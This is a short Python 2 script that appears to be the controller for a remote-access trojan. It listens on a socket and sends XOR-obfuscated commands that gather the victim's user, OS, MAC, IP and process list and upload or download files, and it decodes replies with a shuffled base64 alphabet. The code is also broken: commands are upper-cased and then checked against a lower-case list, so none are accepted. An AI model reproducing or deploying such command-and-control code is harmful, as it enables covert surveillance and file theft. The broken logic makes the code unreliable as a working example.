import socket
from string import maketrans
import base64

ip = '127.0.0.1'
port = 12345

commands = ['exit', 'getUser', 'getOS', 'getMAC', 'getIP', 'getProc', 'download', 'upload']

#Base64 decode data
def decode_base64(data):
    dict = "AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz9876543210+/"
    b64 =  "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"

    translation_tab = maketrans(dict, b64)
    result = data.translate(translation_tab)

    result += '='
    return base64.decodestring(result)

#XOR encode data
def xor_encode(data):
    xored_data = ""
    for c in data:
        xored_data += chr(ord(c) ^ 0x69)
    xored_data += chr(0)
    return xored_data

def main():

    #Set up socket and listen for a connection
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((ip, port))
    s.listen(1)
    conn, addr = s.accept()

    while (1):
        #Get command and check if it is valid
    	command = raw_input("Enter command: ").upper()
    	if command not in commands:
    		print ("Invalid Command")
    		continue

        #Close socket
        if (command == "exit"):
            s.close()
            break
        
        #Send command to the client
        conn.send(xor_encode(command))

        #Receive the file from client
        if (command == "download"):
            path = raw_input("Enter path: ")
            data = conn.recv(100000)
            filedata = decode_base64(data)
            with open(path, 'w') as f:
                f.write(filedata)
            continue

        #Send file to the client
        if (command == "upload"):
            filename = raw_input("Enter filename: ")
            with open(filename, 'rb') as f:
                content = f.read()
                conn.send(xor_encode(content))
            continue

        #Receive data from client
    	data = conn.recv(10000)
    	print decode_base64(data)

#Run the main server function
main()
